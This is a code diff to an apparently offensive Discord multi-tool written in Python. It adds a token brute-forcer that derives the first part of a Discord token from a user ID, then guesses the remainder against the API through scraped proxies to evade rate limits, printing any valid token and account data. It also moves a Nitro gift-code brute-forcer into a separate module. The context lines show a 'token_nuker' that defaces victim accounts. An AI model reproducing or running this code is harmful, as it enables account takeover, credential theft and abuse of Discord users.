@@ -44,10 +44,128 @@ def webhook_delete(url):
     else: print(Colorate.Horizontal(cl["num"], "  [!] Error deleting."))
     input("  Press enter...")
 
-def id_to_token(uid):
+def id_to_token():
+    cl = Theme.get_colors()
+    uid = get_inpt("user_id:")
     import base64
-    try: return base64.b64encode(str(uid).encode()).decode()
-    except: return "???"
+    try:
+        half = base64.b64encode(str(uid).encode()).decode().rstrip('=')
+    except:
+        half = "???"
+    print(Colorate.Horizontal(cl["head"], f"  [+] scraped half token: {half}"))
+    ans = get_inpt("Want to bruteforce the other half?: y/n ")
+    if ans.lower() == 'y':
+        import random, string, time, requests, threading
+        from concurrent.futures import ThreadPoolExecutor
+        
+        use_proxies = get_inpt("Use Proxies? (y/n):").lower() == 'y'
+        proxy_type = "http"
+        proxies_list = []
+        
+        if use_proxies:
+            proxy_type = get_inpt("Proxy Type (http/socks4/socks5):").lower() or "http"
+            print(Colorate.Horizontal(cl["num"], "  [>] Scraping proxies..."))
+            sources = [
+                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all",
+                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+            ]
+            if proxy_type == "socks4":
+                sources = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=yes&anonymity=all",
+                           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
+            elif proxy_type == "socks5":
+                sources = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=yes&anonymity=all",
+                           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]        
+            for url in sources:
+                try:
+                    resp = requests.get(url, timeout=6)
+                    if resp.status_code == 200:
+                        for line in resp.text.split("\n"):
+                            if ":" in line: proxies_list.append(line.strip())
+                except: pass
+            proxies_list = list(set(proxies_list))
+            print(Colorate.Horizontal(cl["head"], f"  [+] Loaded {len(proxies_list)} proxies."))
+        
+        chars = string.ascii_letters + string.digits + "-_"
+        print(Colorate.Horizontal(cl["num"], "  [>] Starting brute force (Ctrl+C to stop)..."))
+        api_url = "https://discord.com/api/v10/users/@me"
+        found = False
+        attempts = 0
+        success_count = 0
+        invalid_count = 0
+        ratelimit_count = 0
+        error_count = 0
+        print_lock = threading.Lock() 
+        
+        def check_token(guess, proxy=None):
+            nonlocal found, success_count, invalid_count, ratelimit_count, error_count, attempts
+            if found:  
+                return False
+                
+            headers = {
+                "Authorization": guess,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+            }
+            proxies_dict = None
+            if proxy and use_proxies:
+                if proxy_type == "http":
+                    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                elif proxy_type == "socks4":
+                    proxies_dict = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
+                elif proxy_type == "socks5":
+                    proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
+            try:
+                response = requests.get(api_url, headers=headers, proxies=proxies_dict, timeout=3)
+                parts = guess.split('.')
+                formatted_token = f"{parts[0]}:{parts[1][:4]}...{parts[2][-4:]}" if len(parts) >= 3 else guess[:10] + "..." + guess[-4:] if len(guess) > 14 else guess
+                with print_lock:
+                    attempts += 1
+                    if response.status_code == 200:
+                        found = True
+                        print(Colorate.Horizontal(cl["success"], f"  [!!!] VALID TOKEN FOUND: {guess}"))
+                        print(Colorate.Horizontal(cl["success"], f"  [!!!] User data: {response.json()}"))
+                        return True
+                    elif response.status_code == 401:
+                        invalid_count += 1
+                        print(Colorate.Horizontal(cl["txt"], f"  [~] Attempt {attempts} | Invalid: {formatted_token}"))
+                        return False
+                    elif response.status_code == 429:
+                        ratelimit_count += 1
+                        print(Colorate.Horizontal(cl["num"], f"  [!] Attempt {attempts} | RateLimited: {formatted_token}"))
+                        time.sleep(random.uniform(1, 3)) 
+                        return False
+                    else:
+                        error_count += 1
+                        print(Colorate.Horizontal(cl["head"], f"  [?] Attempt {attempts} | Error ({response.status_code}): {formatted_token}"))
+                        return False
+            except requests.exceptions.RequestException as e:
+                with print_lock:
+                    attempts += 1
+                    error_count += 1
+                    parts = guess.split('.')
+                    formatted_token = f"{parts[0]}:{parts[1][:4]}...{parts[2][-4:]}" if len(parts) >= 3 else guess[:10] + "..." + guess[-4:] if len(guess) > 14 else guess
+                    print(Colorate.Horizontal(cl["head"], f"  [?] Attempt {attempts} | Error: {formatted_token}"))
+                return False
+        try:
+            with ThreadPoolExecutor(max_workers=50 if use_proxies else 10) as executor:
+                futures = []
+                while not found:
+                    p2 = ''.join(random.choices(chars, k=6))
+                    p3 = ''.join(random.choices(chars, k=38))
+                    guess = f"{half}.{p2}.{p3}"
+                    proxy = None
+                    if use_proxies and proxies_list:
+                        proxy = random.choice(proxies_list)
+                    future = executor.submit(check_token, guess, proxy)
+                    futures.append(future)
+                    if len(futures) > 100:
+                        futures = [f for f in futures if not f.done()]
+                    time.sleep(0.001)
+                    
+        except KeyboardInterrupt:
+            print(Colorate.Horizontal(cl["num"], f"\n  [!] Stopped. Total attempts: {attempts}"))
+        print(Colorate.Horizontal(cl["num"], f"  [!] Completed. Total attempts: {attempts} | Invalid tokens: {invalid_count} | Rate limited: {ratelimit_count} | Errors: {error_count}"))
+        input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
 
 def server_info_lookup(inv):
     cl = Theme.get_colors()
@@ -68,45 +186,8 @@ def server_info_lookup(inv):
     input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
 
 def nitro_generator(tc=1):
-    cl, lock = Theme.get_colors(), threading.Lock()
-    pxs = []
-    print(Colorate.Horizontal(cl["head"], f"  [+] Nitro Gen starting ({tc} threads)..."))
-    _u = get_inpt("Use proxies? (y/n):").lower() == 'y'
-    if _u:
-        _srcs = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
-        for s in _srcs:
-            try:
-                r = requests.get(s, timeout=5)
-                if r.status_code == 200:
-                    for l in r.text.splitlines():
-                        if ":" in l: pxs.append(l.strip())
-            except: pass
-        pxs = list(set(pxs))
-    wh = get_inpt("Webhook for hits (Enter to skip):")
-    st = {"v": 0, "i": 0, "r": 0, "e": 0}
-    def _chk():
-        while True:
-            c = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
-            url = f'https://discord.gift/{c}'
-            p = random.choice(pxs) if _u and pxs else None
-            prox = {"http": f"http://{p}", "https": f"http://{p}"} if p else None
-            try:
-                r = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{c}?with_application=false&with_subscription_plan=true', proxies=prox, timeout=7)
-                with lock:
-                    if r.status_code == 200:
-                        st["v"] += 1; print(f"\n  [$$$] VALID: {url}")
-                        with open("hits.txt", "a") as f: f.write(f"{url}\n")
-                        if wh: requests.post(wh, json={'content': f"Nitro Valid! {url}"})
-                    elif r.status_code == 429: st["r"] += 1
-                    elif r.status_code == 404: st["i"] += 1
-                    else: st["e"] += 1
-            except: st["e"] += 1
-            with lock: print(Colorate.Horizontal(cl["txt"], f"  [~] Hits: {st['v']} | Invalid: {st['i']} | 429s: {st['r']} | Errors: {st['e']}      "), end="\r")
-            if not _u: time.sleep(1)
-    try:
-        for _ in range(tc): threading.Thread(target=_chk, daemon=True).start()
-        while True: time.sleep(1)
-    except: input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
+    from modules.nitrogen import start_generator
+    start_generator(threads=tc)
 
 def bot_invite_gen(bid):
     cl = Theme.get_colors()
@@ -230,7 +311,6 @@ def token_nuker(tk):
 
     def _run():
         nonlocal _active
-        # Start flickering in background
         threading.Thread(target=_flicker, daemon=True).start()
         _log_nuke("Chaos Flicker started.")
 
@@ -266,7 +346,7 @@ def token_nuker(tk):
                     concurrent.futures.wait(futures)
         except: pass
 
-        _active = False # Stop flickering
+        _active = False
         time.sleep(1)
         print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 4 ] Finalizing..."))
         _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Navi"}}, "Set Final White/JP Mode")
